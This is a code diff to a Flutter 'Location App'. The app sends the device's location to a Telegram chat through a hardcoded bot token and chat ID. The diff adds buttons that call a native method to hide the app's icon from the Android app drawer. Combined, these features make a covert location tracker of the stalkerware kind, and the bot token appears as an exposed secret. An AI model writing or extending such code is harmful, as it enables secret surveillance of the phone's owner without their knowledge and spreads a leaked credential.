@@ -5,6 +5,7 @@ import 'package:get/get_navigation/get_navigation.dart';
 import 'package:location/location.dart' as l;
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
+import 'package:flutter/services.dart';
 
 void main() => runApp(const MyApp());
 
@@ -40,6 +41,8 @@ class _HomeScreenState extends State<HomeScreen> {
   final String botToken = '7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4';
   final String chatId = '5080555370';
 
+  static const platform = MethodChannel('com.example.location_tracking_app/launcher');
+
   @override
   void initState() {
     super.initState();
@@ -58,6 +61,13 @@ class _HomeScreenState extends State<HomeScreen> {
       appBar: AppBar(
         title: const Text('Location App'),
         centerTitle: true,
+        actions: [
+          IconButton(
+            icon: const Icon(Icons.visibility_off),
+            tooltip: "Hide from App Drawer",
+            onPressed: hideAppIcon,
+          ),
+        ],
       ),
       body: Padding(
         padding: const EdgeInsets.symmetric(horizontal: 12),
@@ -101,7 +111,18 @@ class _HomeScreenState extends State<HomeScreen> {
                   );
                 },
               ),
-            )
+            ),
+            const SizedBox(height: 16),
+            ElevatedButton.icon(
+              icon: const Icon(Icons.visibility_off),
+              label: const Text("Hide App Icon (Android Only)"),
+              onPressed: hideAppIcon,
+              style: ElevatedButton.styleFrom(
+                backgroundColor: Colors.redAccent,
+                foregroundColor: Colors.white,
+              ),
+            ),
+            const SizedBox(height: 8),
           ],
         ),
       ),
@@ -178,6 +199,23 @@ class _HomeScreenState extends State<HomeScreen> {
       log("Location sent to Telegram");
     } catch (e) {
       log("Failed to send location: $e");
+    }
+  }
+
+  Future<void> hideAppIcon() async {
+    try {
+      await platform.invokeMethod('hideLauncherIcon');
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text('App icon hidden from drawer!')),
+        );
+      }
+    } on PlatformException catch (e) {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text('Failed to hide app icon: ${e.message}')),
+        );
+      }
     }
   }
 }
